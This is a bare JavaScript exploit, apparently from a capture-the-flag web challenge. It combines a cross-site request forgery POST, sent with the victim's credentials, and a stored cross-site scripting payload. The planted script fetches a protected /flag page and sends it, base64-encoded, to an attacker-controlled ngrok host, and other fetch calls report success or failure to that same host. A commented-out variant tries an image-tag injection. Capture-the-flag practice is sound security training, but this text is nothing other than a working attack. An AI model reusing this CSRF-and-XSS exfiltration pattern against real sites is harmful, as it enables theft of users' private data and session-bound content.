fetch('//typeselfsub-support.web.ctfcompetition.com/me', {
     method: 'POST',
     mode: 'no-cors',
     cache: 'no-cache',
     headers: {'Content-Type': 'application/x-www-form-urlencoded'},
     credentials: 'include',
     body: "address=<script>window.onload = () => { fetch('//typeselfsub.web.ctfcompetition.com/flag').then(r => r.text()).then((p) => fetch('//7713b3ef1338.ngrok.io/' %2B btoa(p), { mode: 'no-cors' })); }</script>&csrf=aae1b3c4-8299-4f9e-8db8-3be14b2c8619",
}).then(r => {
  if (!r.ok) {
    fetch('https://7713b3ef1338.ngrok.io/not-ok/');
  }
  window.location = '//typeselfsub-support.web.ctfcompetition.com/me'
}).then()
.catch(e => {
  fetch('https://7713b3ef1338.ngrok.io/fail');
});
//window.location="//7713b3ef1338.ngrok.io/set-location";
/*fetch('//typeselfsub.web.ctfcompetition.com/me', {
     method: 'POST',
     mode: 'no-cors',
     cache: 'no-cache',
     headers: {'Content-Type': 'application/x-www-form-urlencoded'},
     credentials: 'include',
     body: "address=<img src=//7713b3ef1338.ngrok.io/img>&csrf=",
}).then(r => {
  window.location = "//typeselfsub.web.ctfcompetition.com/me";
}).catch(e => {
  fetch('https://7713b3ef1338.ngrok.io/fail');
});*/